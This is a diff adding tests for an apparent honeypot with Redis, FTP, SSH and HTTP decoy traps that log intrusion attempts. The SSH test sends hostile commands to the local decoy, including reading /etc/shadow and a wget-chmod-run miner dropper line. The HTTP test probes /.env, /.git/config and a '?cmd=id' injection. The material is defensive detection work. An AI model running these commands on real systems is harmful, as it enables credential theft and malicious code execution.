@@ -298,3 +298,109 @@ def test_client_falls_back_to_plain_channel_without_cryptography(monkeypatch):
     monkeypatch.setattr(center, "derive_payload_key", None)
     c = center.CenterClient("http://x", "hf_token")
     assert c.key is None and c.encrypt is False
+
+
+def test_low_trap_interactive_redis_and_ftp():
+    async def go():
+        buf = EventBuffer(":memory:")
+        trap = BannerTrap({"port": 0, "banner": "redis_version:6.0.9"}, {"logging": {"max_payload_bytes": 128}}, Emitter(buf))
+        await trap.start("127.0.0.1")
+        r, w = await asyncio.open_connection("127.0.0.1", trap.port)
+        w.write(b"PING\r\n")
+        await w.drain()
+        assert (await r.readline()).strip() == b"+PONG"
+        w.write(b"AUTH mysecretpwd\r\n")
+        await w.drain()
+        assert (await r.readline()).strip() == b"+OK"
+        w.write(b"QUIT\r\n")
+        await w.drain()
+        assert (await r.readline()).strip() == b"+OK"
+        w.close()
+        await asyncio.sleep(0.2)
+        await trap.stop()
+        evs = buf.peek(20)
+        assert any(e["type"] == "auth_attempt" and e["password"] == "mysecretpwd" for e in evs)
+
+        # FTP interaction
+        buf2 = EventBuffer(":memory:")
+        ftp_trap = BannerTrap({"port": 0, "banner": "220 ProFTPD"}, {"logging": {"max_payload_bytes": 128}}, Emitter(buf2))
+        await ftp_trap.start("127.0.0.1")
+        r2, w2 = await asyncio.open_connection("127.0.0.1", ftp_trap.port)
+        assert b"220 ProFTPD" in (await r2.readline())
+        w2.write(b"USER admin\r\n")
+        await w2.drain()
+        assert b"331" in (await r2.readline())
+        w2.write(b"PASS myftppass\r\n")
+        await w2.drain()
+        assert b"530" in (await r2.readline())
+        w2.close()
+        await asyncio.sleep(0.2)
+        await ftp_trap.stop()
+        evs2 = buf2.peek(20)
+        assert any(e["type"] == "auth_attempt" and e["username"] == "admin" and e["password"] == "myftppass" for e in evs2)
+    run(go())
+
+
+def test_ssh_trap_chained_commands_and_recon(tmp_path):
+    async def go():
+        buf = EventBuffer(":memory:")
+        cfg = {"decoys": {"hostname": "db-server", "accept_any_password": True}}
+        trap = SshTrap({"port": 0}, cfg, Emitter(buf), str(tmp_path))
+        await trap.start("127.0.0.1")
+        async with asyncssh.connect("127.0.0.1", trap.port, username="root", password="pwd", known_hosts=None) as conn:
+            # 1. Chained commands execution
+            res = await conn.run("cd /tmp && pwd; whoami")
+            assert "/tmp" in res.stdout and "root" in res.stdout
+
+            # 2. System reconnaissance
+            res = await conn.run("lscpu; nproc; free -m; which wget")
+            assert "x86_64" in res.stdout
+            assert "2" in res.stdout
+            assert "Mem:" in res.stdout
+            assert "/bin/wget" in res.stdout
+
+            # 3. Honeytoken /etc/shadow
+            res = await conn.run("cat /etc/shadow")
+            assert "root:$6$" in res.stdout
+
+            # 4. Dropper & execution emulation
+            res = await conn.run("cd /tmp && wget http://10.0.0.99/miner.sh && chmod +x miner.sh && ./miner.sh")
+            assert "saved" in res.stdout
+
+        await asyncio.sleep(0.3)
+        await trap.stop()
+        evs = buf.peek(50)
+        assert any(e["type"] == "honeytoken" and "/etc/shadow" in e["command"] for e in evs)
+        assert any(e["type"] == "payload" and e.get("data", {}).get("kind") == "download-attempt" for e in evs)
+        assert any(e["type"] == "payload" and e.get("data", {}).get("kind") == "execution-attempt" for e in evs)
+    run(go())
+
+
+def test_http_trap_builtin_honeytokens_and_probes():
+    async def go():
+        buf = EventBuffer(":memory:")
+        trap = HttpTrap({"port": 0}, {}, Emitter(buf))
+        await trap.start("127.0.0.1")
+
+        # 1. Automatic .env honeytoken
+        env_res = await http(trap.port, b"GET /.env HTTP/1.1\r\nHost: target\r\n\r\n")
+        assert b"DB_PASSWORD=" in env_res and b"AWS_ACCESS_KEY_ID=" in env_res
+
+        # 2. Automatic .git/config honeytoken
+        git_res = await http(trap.port, b"GET /.git/config HTTP/1.1\r\nHost: target\r\n\r\n")
+        assert b"repositoryformatversion" in git_res
+
+        # 3. Robots.txt
+        robots_res = await http(trap.port, b"GET /robots.txt HTTP/1.1\r\nHost: target\r\n\r\n")
+        assert b"Disallow: /.env" in robots_res
+
+        # 4. Web attack probe detection
+        probe_res = await http(trap.port, b"GET /index.php?cmd=id HTTP/1.1\r\nHost: target\r\n\r\n")
+        assert b"404 Not Found" in probe_res
+
+        await trap.stop()
+        evs = buf.peek(30)
+        assert any(e["type"] == "honeytoken" and e["command"] == "/.env" for e in evs)
+        assert any(e["type"] == "honeytoken" and e["command"] == "/.git/config" for e in evs)
+        assert any(e["type"] == "payload" and e.get("data", {}).get("kind") == "web-attack-probe" for e in evs)
+    run(go())
